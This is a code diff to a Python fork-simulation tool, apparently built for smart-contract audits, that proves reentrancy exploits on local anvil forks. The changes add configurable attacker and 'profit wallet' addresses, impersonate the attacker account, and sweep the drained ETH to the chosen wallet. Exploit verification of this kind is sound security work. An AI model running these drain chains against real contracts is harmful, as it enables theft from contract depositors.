@@ -388,7 +388,8 @@ class ForkSimulator:
     """
 
     def __init__(self, rpc_url: Optional[str] = None, block: Optional[int] = None,
-                 port: Optional[int] = None):
+                 port: Optional[int] = None, attacker: Optional[str] = None,
+                 profit_wallet: Optional[str] = None):
         self.rpc_url = rpc_url
         self.block = block
         self.port = port or self._free_port()
@@ -397,7 +398,11 @@ class ForkSimulator:
         self.why_not = ""
         # anvil dev account #2: always unlocked + funded on any anvil fork, and
         # from the protocol's perspective it is just an arbitrary EOA.
-        self.attacker = "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC"
+        # Both are user-overridable: --attacker is the EOA that SIGNS the
+        # proof txs, --profit-wallet is where the attacker-contract drain
+        # lands (defaults to the attacker EOA).
+        self.attacker = attacker or "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC"
+        self.profit_wallet = profit_wallet or self.attacker
         # real ABI for the target (when known) — see run(abi=...)
         self._abi: List[Dict] = []
         self._attack_candidates: List[tuple] = []
@@ -533,7 +538,18 @@ class ForkSimulator:
         return proc.stdout.strip() or proc.stderr.strip()
 
     def _fund_attacker(self) -> bool:
-        """Give the attacker 1 ETH on the fork so real sends can pay gas."""
+        """Give the attacker 2 ETH on the fork so real sends can pay gas.
+
+        A user-supplied --attacker is not an anvil dev account, so it must be
+        impersonated first (anvil_impersonateAccount) for --unlocked sends to
+        work. Dev accounts impersonate fine too (no-op).
+        """
+        imp = subprocess.run(
+            ["cast", "rpc", "anvil_impersonateAccount", self.attacker,
+             "--rpc-url", self.rpc_url_local],
+            capture_output=True, text=True, timeout=30)
+        if imp.returncode != 0:
+            return False
         proc = subprocess.run(
             ["cast", "rpc", "anvil_setBalance", self.attacker,
              "0x1BC16D674EC80000", "--rpc-url", self.rpc_url_local],  # 2 ETH
@@ -667,7 +683,8 @@ class ForkSimulator:
         return proc.stdout.strip() if proc.returncode == 0 else ""
 
     def prove_reentrancy(self, target: str, payout_sig: str = "withdraw(uint256)",
-                         amount: str = "1", demo: bool = False) -> Dict:
+                         amount: str = "1", demo: bool = False,
+                         profit_wallet: Optional[str] = None) -> Dict:
         """One-block exploit chain: deploy a ReentrancyAttacker whose fallback
         re-enters the victim's payout, seed a deposit, fire the chain, and
         read the state diff (reentries + victim ETH before → after).
@@ -705,9 +722,10 @@ class ForkSimulator:
                     "error": f"could not encode payload for {payout_sig}",
                     "attack": "reentrancy", "target": target}
 
+        owner = profit_wallet or self.profit_wallet
         dep = self._deploy(art["bytecode"],
                            ["address", "address", "bytes"],
-                           [target, self.attacker, payload])
+                           [target, owner, payload])
         if not dep.get("ok"):
             return {"success": False, "verdict": "UNVERIFIED",
                     "error": f"attacker deploy failed: {dep.get('stderr', '')[:120]}",
@@ -758,8 +776,10 @@ class ForkSimulator:
                                "a single deposit in one block"),
                     "steps": steps,
                     "evidence": (f"ReentrancyAttacker re-entered {n}×; "
-                                 f"victim ETH {seeded} → {after}"),
-                    "attacker_address": attacker_addr}
+                                 f"victim ETH {seeded} → {after}; "
+                                 f"drain swept to profit wallet {owner}"),
+                    "attacker_address": attacker_addr,
+                    "profit_wallet": owner}
         return {"success": False, "verdict": "UNVERIFIED",
                 "error": (f"drain chain did not demonstrate reentrancy: "
                           f"{'go() reverted' if not chain['ok'] else 'no re-entry / no balance drop'}"),
@@ -794,13 +814,17 @@ class ForkSimulator:
             res["verdict"] = "UNVERIFIED"
         return res
 
-    def offline_demo(self) -> Dict:
+    def offline_demo(self, profit_wallet: Optional[str] = None) -> Dict:
         """End-to-end offline self-test: deploy the vulnerable SimpleVault demo
         on a blank anvil chain, then prove a reentrancy drain against it.
 
         This is the CI-safe version of prove_reentrancy — it never touches a
         mainnet RPC. Verdict should be CONFIRMED when the whole machinery
         (compiler → deploy → seed → drain chain → state diff) works.
+
+        profit_wallet: optional address the drained ETH is swept to (defaults
+        to the attacker EOA). Pass a custom wallet to show the drain landing
+        in the caller's own address.
         """
         if not self.available:
             return {"success": False, "verdict": "UNVERIFIED",
@@ -817,7 +841,7 @@ class ForkSimulator:
                     "error": f"demo deploy failed: {dep.get('stderr', '')[:150]}",
                     "attack": "reentrancy", "demo": True}
         return self.prove_reentrancy(dep["address"], "withdraw(uint256)", "1",
-                                     demo=True)
+                                     demo=True, profit_wallet=profit_wallet)
 
     def _run_impl(self, attack: str, target: str, source_finding: Optional[Dict] = None) -> Dict:
         """Prove the finding on a real anvil fork.
